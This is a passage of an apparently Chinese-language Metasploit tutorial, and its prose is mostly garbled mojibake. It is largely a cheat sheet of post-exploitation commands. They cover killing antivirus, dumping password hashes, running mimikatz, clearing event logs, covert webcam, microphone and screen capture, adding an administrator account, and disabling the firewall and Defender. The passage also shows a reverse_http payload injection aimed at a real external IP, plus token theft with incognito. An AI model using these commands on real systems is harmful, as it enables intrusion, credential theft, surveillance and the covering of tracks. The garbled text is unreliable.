<h3 id="3ã€-æ›´æ–°-MSF"><a href="#3ã€-æ›´æ–°-MSF" class="headerlink" title="3ã€ æ›´æ–° MSF"></a>3ã€ æ›´æ–° MSF</h3><p>ç›®å‰æ›´æ–°å¯èƒ½æœƒå°è‡´å•Ÿå‹•å¤±è´¥ï¼ŒåŸå› åœ¨æ›´æ–°è¿‡ç¨‹ä¸­ç¼ºå°‘ä¸€äº›ç»„ä»¶ï¼Œæ›´æ–°åéœ€è¦æ‰‹å‹•æ‰§è¡Œå®‰è£…ç¼ºå°‘éƒ¨åˆ†çš„ç»„ä»¶</p>
<p>apt update<br>apt install metasploit-framework</p>
<h3 id="4ã€-MSF-åŸºæœ¬ä½¿ç”¨æ–¹æ³•"><a href="#4ã€-MSF-åŸºæœ¬ä½¿ç”¨æ–¹æ³•" class="headerlink" title="4ã€ MSF åŸºæœ¬ä½¿ç”¨æ–¹æ³•"></a>4ã€ MSF åŸºæœ¬ä½¿ç”¨æ–¹æ³•</h3><p>bannerï¼šç‰ˆæœ¬ä¿¡æ¯<br>help æˆ–è€… ? ï¼šæ˜¾ç¤º msfconsole å¯ä»¥ä½¿ç”¨çš„å‘½ä»¤ã€‚help <command>ï¼Œæ˜¾ç¤ºæŸä¸€å‘½ä»¤çš„ç”¨æ³•<br>connectï¼š å¯ä»¥ç†è§£æˆ MSF ä¸­çš„ nc å‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ connect -h æŸ¥çœ‹è¯¦ç»†ç”¨æ³•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">connect [options] &lt;host&gt; &lt;port&gt;</span><br><span class="line"></span><br><span class="line">connect 192.168.1.1 80</span><br></pre></td></tr></table></figure>

<p>showï¼š ç”¨ show å‘½ä»¤æŸ¥çœ‹ msf æä¾›çš„èµ„æºã€‚åœ¨æ ¹ç›®å½•ä¸‹æ‰§è¡Œçš„è¯ï¼Œç”±äºæœ‰äº›æ¨¡å—èµ„æºæ¯”è¾ƒå¤šï¼Œéœ€è¦æ‰§è¡Œ show å‘½ä»¤è¦è¾ƒé•¿çš„æ—¶é—´<br>show options/payloads/targets /evasion/missing/</p>
<p>searchï¼š æœç´¢æ¨¡å—ï¼›ç®€å•æœç´¢ï¼š</p>
<p>search -h<br>search [<options>] [<keywords>:<value>]</p>
<p>seach ms10-046</p>
<p>å¤šæ¡ä»¶æœç´¢<br>search name:mysql type:exploit platform:linux<br>search name:mysql / platform:mysql /cve:2015/ path/  type:auxiliary/author:aaron</p>
<p>useï¼š search æ‰¾åˆ°æ¨¡å—åï¼Œç”¨ use ä½¿ç”¨æ¨¡å—</p>
<p>use exploit/windows/smb/ms08_067_netapi</p>
<p>ç”¨ use ä½¿ç”¨ä¸€ä¸ªæ¨¡å—åï¼Œå¯ä»¥ä½¿ç”¨ show options æŸ¥çœ‹æˆ‘ä»¬éœ€è¦é…ç½®çš„é€‰é¡¹ã€ä½¿ç”¨ show targetsé€‰æ‹©ç›®æ ‡ä¸»æœºç³»ç»Ÿã€ä½¿ç”¨ show payloads é€‰æ‹© payloadã€ä½¿ç”¨ show advanced æŸ¥çœ‹é«˜çº§å‚æ•°ã€ä½¿ç”¨show evasion æŸ¥çœ‹ç”¨æ¥åšæ··æ·†ã€é€ƒé¿çš„æ¨¡å—</p>
<p>set/setgï¼š è®¾ç½®å‚æ•°ï¼Œæ¯”å¦‚è¦æ¸—é€çš„ä¸»æœº IPã€payload ç­‰ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ show missing æŸ¥çœ‹æ²¡æœ‰è®¾ç½®çš„å‚æ•°;<br>setg æ˜¯è®¾ç½®å…¨å±€å˜é‡ï¼Œé¿å…æ¯ä¸ªæ¨¡å—éƒ½è¦è¾“å…¥ç›¸åŒçš„å‚æ•°</p>
<p>unset/unsetg: å–æ¶ˆè®¾ç½®å‚æ•°ã€‚unsetg æ˜¯å–æ¶ˆè®¾ç½®çš„å…¨å±€å˜é‡</p>
<p>saveï¼š è®¾ç½®çš„å‚æ•°åœ¨ä¸‹ä¸€æ¬¡å•Ÿå‹•çš„æ—¶å€™ä¸ä¼šç”Ÿæ•ˆï¼Œå¯ä»¥ç”¨ save ä¿å­˜æˆ‘ä»¬ä½¿ç”¨è¿‡ç¨‹çš„è®¾ç½®ã€‚<br>/root/.msf4/config cat åˆ°æ–‡ä»¶é‡Œé€²è¡ŒæŸ¥çœ‹</p>
<p>checkï¼šæ£€æŸ¥ç›®æ ‡æ˜¯å¦çœŸçš„å­˜åœ¨è¿™ä¸ªæ¼æ´ï¼Œå¤§éƒ¨åˆ†æ¨¡å—æ²¡æœ‰ check åŠŸèƒ½</p>
<p>run/exploitï¼šæ”»å‡»</p>
<p>jobs/killï¼šæ€æ­»é€²ç¨‹</p>
<p>sessionï¼šå»ºç«‹ä¼šè¯</p>
<h2 id="äº”ã€-MSF-åç«¯æ•°æ®åº“å‘½ä»¤"><a href="#äº”ã€-MSF-åç«¯æ•°æ®åº“å‘½ä»¤" class="headerlink" title="äº”ã€ MSF åç«¯æ•°æ®åº“å‘½ä»¤"></a>äº”ã€ MSF åç«¯æ•°æ®åº“å‘½ä»¤</h2><p>db_connect #è¿æ¥æ•°æ®åº“<br>db_disconnect #æ–­å¼€å½“å‰æ•°æ®åº“<br>db_export #å¯¼å‡ºæ•°æ®åº“<br>db_import #å¯¼å…¥æ•°æ®åº“<br>db_nmap #æ‰§è¡Œ nmap æ‰«æ<br>db_rebuild_cache # é‡å»ºæ•°æ®åº“å­˜å‚¨çš„æ¨¡å—é«˜é€Ÿç¼“å­˜<br>db_status #æ˜¾ç¤ºå½“å‰æ•°æ®åº“çŠ¶æ€<br>hosts #åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰ä¸»æœº<br>loot # æŸ¥çœ‹æ‰«å‡ºæ¥çš„å¯†ç ä¿¡æ¯<br>notes #åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰ç¬”è®°<br>services #åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æœåŠ¡<br>vulns #åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æ¼æ´<br>workspace #åœ¨æ•°æ®åº“å·¥ä½œåŒºä¹Šé—´åˆ‡æ¢</p>
<h2 id="å…­ã€-Meterpreter-åŸºæœ¬å‘½ä»¤"><a href="#å…­ã€-Meterpreter-åŸºæœ¬å‘½ä»¤" class="headerlink" title="å…­ã€ Meterpreter åŸºæœ¬å‘½ä»¤"></a>å…­ã€ Meterpreter åŸºæœ¬å‘½ä»¤</h2><h3 id="1-meterpreter-ç®€ä»‹"><a href="#1-meterpreter-ç®€ä»‹" class="headerlink" title="1. meterpreter ç®€ä»‹"></a>1. meterpreter ç®€ä»‹</h3><ol>
<li>Meterpreter æ¯”ç³»ç»Ÿ shell æ›´åŠ çµæ´»ï¼ŒåŠŸèƒ½æ›´åŠ ä¸°å¯Œï¼Œä¾‹å¦‚ç›‘æ§ä¸»æœºï¼Œç›‘æ§é”®ç›˜ï¼Œé–‹å•Ÿæ‘„åƒå¤´ï¼Œéº¦å…‹é£ï¼Œè¿˜å¯ä»¥çµæ´»çš„è·å–ä½ çš„æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼›</li>
<li>é«˜çº§ï¼Œå‹•æ…‹ï¼Œå¯æ‰©å±•çš„ payload,ä¸€ç«™å¼åæ”»å‡» payloadï¼›</li>
<li>åŸºäº meterpreter ä¸Šä¸‹æ–‡åˆ©ç”¨æ›´å¤šæ¼æ´å‘èµ·æ”»å‡»ï¼›</li>
<li>åæ¸—é€æµ‹è¯•é˜¶æ®µä¸€ç«™å¼æ“ä½œç•Œé¢ï¼› </li>
<li>å®Œå…¨åŸºäºå†…å­˜çš„ DLL æ³¨å…¥å¼ payloadï¼ˆä¸å†™ç¡¬ç›˜ï¼‰;</li>
<li>æ³¨å…¥åˆæ³•ç³»ç»Ÿé€²ç¨‹ä¸¦å»ºç«‹ stager; </li>
<li>åŸºäº stager ä¸Šä¼ å’Œé¢„åŠ è½½ DLL é€²è¡Œæ‰©å±•æ¨¡å—çš„æ³¨å…¥(å®¢æˆ·ç«¯ API); </li>
<li>åŸºäº stager å»ºç«‹çš„ socket é€£æ¥å»ºç«‹åŠ å¯†çš„ TLS/1.0 é€šä¿¡</li>
<li>åˆ©ç”¨ TLS éš§é“é€²ä¸€æ­¥åŠ è½½åç»­æ‰©å±•æ¨¡å—(é¿å…ç½‘ç»œå–è¯);</li>
</ol>
<h3 id="2-Meterpreter-åŸºæœ¬å‘½ä»¤"><a href="#2-Meterpreter-åŸºæœ¬å‘½ä»¤" class="headerlink" title="2. Meterpreter åŸºæœ¬å‘½ä»¤"></a>2. Meterpreter åŸºæœ¬å‘½ä»¤</h3><p>å‰ææ˜¯æ¼æ´åˆ©ç”¨æˆåŠŸï¼Œpayload ç”¨çš„æ˜¯ meterpreter</p>
<p>lpwd/lcd #ä»æœ¬æœºä¸Šä¼ åˆ°ç›®æ ‡æœºç”¨å¾—åˆ°çš„å‘½ä»¤<br>run/bgrun #run åœ¨å‰å°ï¼Œbgrun åœ¨åå°<br>bgrun killav #æ€æ‰ç›®æ ‡æœºçš„æ€æ¯’è½¯ä»¶<br>bgrun hashdump #å“ˆå¸Œå€¼<br>bgrun service_manager -l #æŸ¥çœ‹å·²æœ‰çš„æœåŠ¡<br>bgrun vnc #ç›‘æ§ä¸»æœº<br>bgrun winbf #è®©è‚‰é¸¡æ¥æš´åŠ›ç ´è§£<br>clearev #æ¸…é™¤ç›®æ ‡çš„æ—¥å¿—ï¼Œæ¸…ç†æˆ“åœº<br>download #ä¸‹è½½æ–‡ä»¶<br>upload #ä¸Šå‚³æ–‡ä»¶ upload /usr/share/windows-binaries/nc.exe c:\windows\system32<br>execute #æ‰§è¡Œç¨‹åº<br>getuid #è·å–å½“å‰ç”¨æˆ· ID<br>getsystem #æŠŠè‡ªå·±å˜æˆ system æƒé™<br>getprivs #çœ‹ç³»ç»Ÿéƒ½æœ‰ä»€ä¹ˆæƒé™<br>getproxy #è·å–ä»£ç†ä¿¡æ¯<br>getpid #æŸ¥çœ‹è¿šç¨‹ä¿¡æ¯<br>getpid/ps/migrate 1560 #è¿ç§»åé—¨é€²ç¨‹<br>hashdump=run post/windows/gather/hashdump<br>sysinfo è·å–ç³»ç»Ÿä¿¡æ¯<br>kill 1052 #æ€æ‰é€²ç¨‹ï¼Œ1052 æ˜¯é€²ç¨‹å·<br>shell #é€²å…¥ç³»ç»Ÿ shell<br>show_mount #æŸ¥çœ‹ç³»ç»ŸæŒ‚è½½ä¿¡æ¯<br>search #æŸ¥æ‰¾æ–‡ä»¶ï¼Œä¾‹ search -f win.ini<br>arp #ç”¨äºæŸ¥çœ‹ä¸»æœºä¸Šçš„ arp ç¼“å­˜ä¿¡æ¯<br>netstat #æŸ¥çœ‹ç½‘ç»œé€£æ¥ä¿¡æ¯<br>ipconfig/ifconfig #æŸ¥çœ‹ç½‘å¡ä¿¡æ¯<br>route -h #æŸ¥çœ‹è·¯ç”±è¡¨<br>ldletime<br>resource -r r.txt<br>record_mic #éº¦å…‹é£<br>Webcam_list</p>
<p>mi<br>hashdump<br>creds_all</p>
<p>run/bgrun killav/bgrun persistence/bgrun hashdump/bgrun vnc/sound_recorder/webcam/winbf<br>å‰å°è¿è¡ŒæŒ‡å®šå‘½ä»¤/åå°ä¸è¿è¡Œï¼Œå…³é—­æ€æ¯’è½¯ä»¶/å»ºç«‹æŒä¹…è¿æ¥ï¼Œå°† shellcode å†™å…¥ç³»ç»Ÿæ–‡ä»¶ï¼Œå¼€æœºè‡ªå•Ÿ/é–‹å•Ÿå›¾å½¢åŒ–è¿›ç¨‹ç®¡ç†/å½•åˆ¶å£°éŸ³/å¼€å­æ‘„åƒå¤´/è®©è‚‰é¸¡å¸®å¿™æš´åŠ›ç ´è§£å¯†ç ï¼Œåˆ©ç”¨è‚‰é¸¡èµ„æº</p>
<p>cd/ls/cat/pwd/dir/mkdir/mv/rm/rmdir/edit/å¯ä»¥ä½¿ç”¨ linux å‘½ä»¤<br>è¿šå…¥/æ˜¾ç¤ºæ–‡ä»¶/æŸ¥çœ‹/æ˜¾ç¤ºå½“å‰è·¯å¾„/æ˜¾ç¤ºæ–‡ä»¶/åˆ›å»ºç›®å½•/ç§»åŠ¢/åˆé™¤/åˆé™¤ç›®å½•/ç¼–è¾‘</p>
<p>lpwd/lcd æœ¬åœ°ç›®å½•</p>
<p>local å½“å‰çš„å·¥ä½œç›®å½•ï¼Œå°±æ˜¯åœ¨ kali ä¸Šçš„æˆ‘ä»¬ä½¿ç”¨çš„å·¥ä½œç›®å½•/è¿šå…¥æˆ‘ä»¬æœ¬åœ°ç›®å½•</p>
<p>clearev/download/upload /usr/share/windows binaries/nc.exe c:\windows\system32<br>åˆé™¤ç›®æ ‡ç³»ç»Ÿæ—¥å¿—/ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°/ä¸Šä¼ æœ¬åœ°æ–‡ä»¶åˆ°ç›®æ ‡ç³»ç»Ÿ<br>æ³¨ï¼šå› ä¸º\åœ¨ linux ä¸­æœ‰è½¬ä¹‰ç¬¦çš„å«ä¹‰ï¼Œæ‰€ä»¥æ‰§è¡Œ linux å‘½ä»¤æ—¶è¦ç”¨ä¸¤ä¸ª\è¡¨ç¤ºç›®æ ‡ windows çš„\win+r eventvwr</p>
<p>windows æ—¥å¿—æŸ¥çœ‹</p>
<p>execute -f cmd.exe -i -H -f æ‰§è¡Œç›®æ ‡ç³»ç»Ÿé‡Œçš„å“ªä¸ªç¨‹åºï¼Œ-i å’Œæ‰§è¡Œçš„è¿™ä¸ªç¨‹åºè¿šè¡Œäº¤äº’ï¼Œ-H å°†è¿™ä¸ªç¨‹åºçª—å£éšè—èµ·æ¥æ‰§è¡Œ</p>
<p>getuid/getsystem/getprivs/getproxy/getpid/migrate<br>ä»¥å“ªä¸ªç”¨æˆ·è´¦å·ç™»é™†åˆ°ç›®æ ‡ç³»ç»Ÿçš„/å¼ºåˆ¶è·å–æˆ system è´¦å·ï¼Œè·å¾—ç³»ç»Ÿæƒé™/æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™/è·å–ç›®æ ‡ç³»ç»Ÿä»£ç†ä¿¡æ¯/æŸ¥çœ‹å½“å‰ shellcode çš„çº¿ç¨‹åœ¨ç›®æ ‡ç³»ç»Ÿå“ªä¸ªè¿šç¨‹å½“ä¸­/è¿ç§»çº¿ç¨‹åˆ°å…¶å®ƒé€²ç¨‹ä¸­</p>
<p>hashdump/run post/windows/gather/hashdump<br>ç³»ç»Ÿè´¦å·å“ˆå¸Œå€¼/ç³»ç»Ÿè´¦å·å“ˆå¸Œå€¼</p>
<p>sysinfo/ps/kill/reboot/shutdown/shell<br>ç›®æ ‡ç³»ç»Ÿä¿¡æ¯/æŸ¥çœ‹è¿šç¨‹/æŸ¥æ€è¿šç¨‹/é‡å­/å…³é—­/è·å¾—ä¸€ä¸ªç›®æ ‡æ“ä½œç³»ç»Ÿçš„ shellï¼Œé€€å‡ºåˆ° meterpreterç”¨ exit</p>
<p>show_mount/search -f autoexec.bat<br>å½“å‰æŒ‚è½½äº†å‡ ä¸ªç³»ç»Ÿåˆ†åŒº/æœç´¢ç›®æ ‡ç³»ç»Ÿä¸­çš„æ–‡ä»¶</p>
<p>arp/netstat/ipconfig/ifconfig/route<br>æŸ¥çœ‹ç›®æ ‡æœºå™¨çš„ arp ç¼“å­˜/æŸ¥çœ‹ç›®æ ‡ç«¯å£è¿æ¥/ip åœ°å€/ip åœ°å€/æŸ¥çœ‹ç›®æ ‡è·¯ç”±è¡¨</p>
<p>idletime/resource<br>æŸ¥çœ‹ç›®æ ‡æ“ä½œç³»ç»Ÿç©ºé—²æ—¶é—´/è°ƒç”¨å¤–éƒ¨çš„èµ„æºæ–‡ä»¶ï¼Œè‡ªåŠ¢åŒ–æ‰§è¡Œ</p>
<p>record_mic/webcam_list/webcam_snap -i 1 -v false<br>è®°å½•ç›®æ ‡éº¦å…‹é£çš„å£°éŸ³/åˆ—å‡ºç›®æ ‡ç³»ç»Ÿä¸Šæ‰€æœ‰çš„æ‘„åƒå¤´/æ¯éš‘ä¸€ç§’é’Ÿç”¨æ‘„åƒå¤´æ‹ç…§ä¸€æ¬¡</p>
<p>æ¡Œé¢æŠ“å›¾ï¼šscreenshot<br>æ‹ç…§ï¼šwebcam_snap<br>è§†é¢‘å¼€å¯ï¼šwebcam_stream<br>å¼€å¯è¿œç¨‹æ¡Œé¢ï¼šrun post/windows/manage/enable_rdp<br>æ·»åŠ è´¦å·ï¼šnet user test 123 /add<br>è·å–ç³»ç»Ÿç®¡ç†å¯†ç ï¼šload mimikatz<br>wdigest</p>
<h3 id="ä¸ƒã€-Poståæ¸—é€æ¨¡å—"><a href="#ä¸ƒã€-Poståæ¸—é€æ¨¡å—" class="headerlink" title="ä¸ƒã€ Poståæ¸—é€æ¨¡å—"></a>ä¸ƒã€ Poståæ¸—é€æ¨¡å—</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;migrate           #è‡ªåŠ¨è¿›ç¨‹è¿ç§»</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;checkvm           #æŸ¥çœ‹ç›®æ ‡ä¸»æœºæ˜¯å¦è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Š</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;killav            #å…³é—­æ€æ¯’è½¯ä»¶</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp        #å¼€å¯è¿œç¨‹æ¡Œé¢æœåŠ¡</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;autoroute         #æŸ¥çœ‹è·¯ç”±ä¿¡æ¯</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users    #åˆ—ä¸¾å½“å‰ç™»å½•çš„ç”¨æˆ·</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications       #åˆ—ä¸¾åº”ç”¨ç¨‹åº</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin #æŠ“å–è‡ªåŠ¨ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç </span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump               #dumpå‡ºæ‰€æœ‰ç”¨æˆ·çš„hash</span><br><span class="line">run getgui -u hack -p 123</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_patches   è¡¥ä¸ä¿¡æ¯</span><br><span class="line">run  post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester   æŸ¥è¯¢å¯åˆ©ç”¨çš„æ¼æ´</span><br></pre></td></tr></table></figure>


<p>æœ‰æ—¶å€™æ— æ³•ä½¿ç”¨åæ¸—é€æ¨¡å—æ·»åŠ ç”¨æˆ·ï¼Œå¯ä»¥ä½¿ç”¨shellè‡ªä¸»æ·»åŠ </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net user hack Zyx960706 &#x2F;add</span><br><span class="line">net localgroup administrator hack &#x2F;add</span><br><span class="line">netsh advfirewall set allprofiles state off        #å…³é—­é˜²ç«å¢™</span><br><span class="line">net stop windefend</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_patches   è¡¥ä¸ä¿¡æ¯</span><br><span class="line">run  post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester   æŸ¥è¯¢å¯åˆ©ç”¨çš„æ¼æ´</span><br></pre></td></tr></table></figure>

<p>åŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹ï¼ˆç³»ç»Ÿã€ç«¯å£ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweep    #åŸºäºudpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_probe    #åŸºäºudpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname         #åŸºäºnetbiosåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp           #åŸºäºtcpè¿›è¡Œç«¯å£æ‰«æ(1-10000)ï¼Œå¦‚æœå¼€æ”¾äº†ç«¯å£ï¼Œåˆ™è¯´æ˜è¯¥ä¸»æœºå­˜æ´»</span><br></pre></td></tr></table></figure>

<p>ç«¯å£æ‰«æ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp           #åŸºäºtcpè¿›è¡Œç«¯å£æ‰«æ(1-10000)</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ack           #åŸºäºtcpçš„ackå›å¤è¿›è¡Œç«¯å£æ‰«æï¼Œé»˜è®¤æ‰«æ1-10000ç«¯å£</span><br><span class="line">ç«¯å£æ‰«ææœ‰æ—¶ä¼šä½¿ä¼šè¯ç»ˆç«¯ï¼Œæ‰€ä»¥å¯ä»¥ä¸Šä¼ nmapååœ¨shellä¸­ä½¿ç”¨nmapæ‰«æã€‚ä½†æ˜¯è¦è®°å¾—æ¸…ç†</span><br></pre></td></tr></table></figure>

<p>æœåŠ¡æ‰«æ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_version        #å‘ç°å†…ç½‘ftpæœåŠ¡ï¼ŒåŸºäºé»˜è®¤21ç«¯å£</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_version        #å‘ç°å†…ç½‘sshæœåŠ¡ï¼ŒåŸºäºé»˜è®¤22ç«¯å£</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version  #å‘ç°å†…ç½‘telnetæœåŠ¡ï¼ŒåŸºäºé»˜è®¤23ç«¯å£</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;dns&#x2F;dns_amp            #å‘ç°dnsæœåŠ¡ï¼ŒåŸºäºé»˜è®¤53ç«¯å£</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;http&#x2F;http_version      #å‘ç°å†…ç½‘httpæœåŠ¡ï¼ŒåŸºäºé»˜è®¤80ç«¯å£</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;http&#x2F;title             #æ¢æµ‹å†…ç½‘httpæœåŠ¡çš„æ ‡é¢˜</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version        #å‘ç°å†…ç½‘smbæœåŠ¡ï¼ŒåŸºäºé»˜è®¤çš„445ç«¯å£   </span><br><span class="line">use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_schemadump  #å‘ç°å†…ç½‘SQLServeræœåŠ¡,åŸºäºé»˜è®¤çš„1433ç«¯å£</span><br><span class="line">use auxiliary&#x2F;scanner&#x2F;oracle&#x2F;oracle_hashdump  #å‘ç°å†…ç½‘oracleæœåŠ¡,åŸºäºé»˜è®¤çš„1521ç«¯å£</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_version    #å‘ç°å†…ç½‘mysqlæœåŠ¡ï¼ŒåŸºäºé»˜è®¤3306ç«¯å£</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;rdp&#x2F;rdp_scanner        #å‘ç°å†…ç½‘RDPæœåŠ¡ï¼ŒåŸºäºé»˜è®¤3389ç«¯å£</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;redis&#x2F;redis_server     #å‘ç°å†…ç½‘RedisæœåŠ¡ï¼ŒåŸºäºé»˜è®¤6379ç«¯å£</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;db2&#x2F;db2_version        #æ¢æµ‹å†…ç½‘çš„db2æœåŠ¡ï¼ŒåŸºäºé»˜è®¤çš„50000ç«¯å£</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname         #æ¢æµ‹å†…ç½‘ä¸»æœºçš„netbiosåå­—</span><br></pre></td></tr></table></figure>


<h3 id="å…«ã€-msf-ä¼šè¯ä¼ é€’-cs"><a href="#å…«ã€-msf-ä¼šè¯ä¼ é€’-cs" class="headerlink" title="å…«ã€ msf ä¼šè¯ä¼ é€’ cs"></a>å…«ã€ msf ä¼šè¯ä¼ é€’ cs</h3><p>åˆ›å»ºç›‘å¬ beacon http  è®¾ç½® http hostã€ http host(stager)ã€ profileã€ http port(c2) æ˜ å°„ç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost 101.42.249.212</span><br><span class="line">set lport æ˜ å°„ç«¯å£</span><br><span class="line">set session 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="ä¹ã€-MSFä»¤ç‰Œçªƒå–"><a href="#ä¹ã€-MSFä»¤ç‰Œçªƒå–" class="headerlink" title="ä¹ã€ MSFä»¤ç‰Œçªƒå–"></a>ä¹ã€ MSFä»¤ç‰Œçªƒå–</h3><p>ä¸åŒçš„ç”¨æˆ·ç™»å½•è®¡ç®—æœºåï¼Œ éƒ½ä¼šç”Ÿæˆä¸€ä¸ªAccess Tokenï¼Œè¿™ä¸ªTokenåœ¨ç”¨æˆ·åˆ›å»ºè¿›ç¨‹æˆ–è€…çº¿ç¨‹æ—¶ä¼šè¢«ä½¿ç”¨ï¼Œä¸æ–­çš„æ‹·è´ï¼›</p>
<p>æ¯”å¦‚Aç”¨æˆ·åˆ›å»ºä¸€ä¸ªè¿›ç¨‹è€Œè¯¥è¿›ç¨‹Bç”¨æˆ·æ²¡æœ‰æƒé™ï¼Œä¸€èˆ¬ç”¨æˆ·åŒå‡»è¿è¡Œä¸€ä¸ªè¿›ç¨‹éƒ½ä¼šæ‹·è´explorer.exeçš„Access Tokenï¼›</p>
<p>è¿™é‡Œæœ‰ä¸¤ç§ç±»å‹çš„ä»¤ç‰Œ</p>
<ol>
<li><p>æˆæƒä»¤ç‰Œï¼ˆDelegation Tokensï¼‰ï¼Œå®ƒæ”¯æŒäº¤äº’å¼ç™»å½•ï¼Œä¾‹å¦‚è¿œç¨‹æ¡Œé¢ï¼Œç”¨æˆ·æ¡Œé¢è®¿é—®ã€‚</p>
</li>
<li><p>æ¨¡æ‹Ÿä»¤ç‰Œï¼ˆImpersonation Tokensï¼‰ï¼Œå®ƒæ”¯æŒéäº¤äº’å¼çš„ä¼šè¯ï¼Œä¾‹å¦‚è®¿é—®ç›®æ ‡å…±äº«æ–‡ä»¶ã€‚</p>
</li>
</ol>
<p>ä¸¤ç§ä»¤ç‰Œä¼šåœ¨ç³»ç»Ÿé‡å¯åæ‰ä¼šæ¸…é™¤ï¼›æˆæƒä»¤ç‰Œåœ¨ç”¨æˆ·æ³¨é”€åï¼Œè¯¥ä»¤ç‰Œä¼šå˜ä¸ºæ¨¡æ‹Ÿä»¤ç‰Œä¼šä¾æ—§æœ‰æ•ˆ</p>
<p>ä»¤ç‰Œçªƒå–</p>
<ol>
<li><p>è·å–åˆ°äº†ç›®æ ‡æœºå™¨çš„ meterpreter shell</p>
</li>
<li><p>ä½¿ç”¨å†…ç½®çš„å·¥å…· incognito</p>
</li>
</ol>
<p>use incognito</p>
<p>list_tokens -u</p>
<p>å¦‚æœè¿è¡Œçš„shellæ˜¯ä¸€ä¸ªsystemæƒé™çš„ï¼Œå°±å¯ä»¥çªƒå–åˆ°systemå’Œæ¯”systemæƒé™ä½çš„ç”¨æˆ·</p>
<ol start="3">
<li>åˆ‡æ¢åŸŸç®¡çš„ä»¤ç‰Œ</li>
</ol>
<p>impersonate_token â€˜ä¸»æœºå\Administratorâ€™</p>
<p>è¿”å›åŸæ¥çš„æƒé™<br>rev2self </p>
<h2 id="åã€-æµç¨‹"><a href="#åã€-æµç¨‹" class="headerlink" title="åã€ æµç¨‹"></a>åã€ æµç¨‹</h2><p>1ã€æŸ¥æ‰¾ ms08-067 æ¼æ´æ¨¡å—</p>
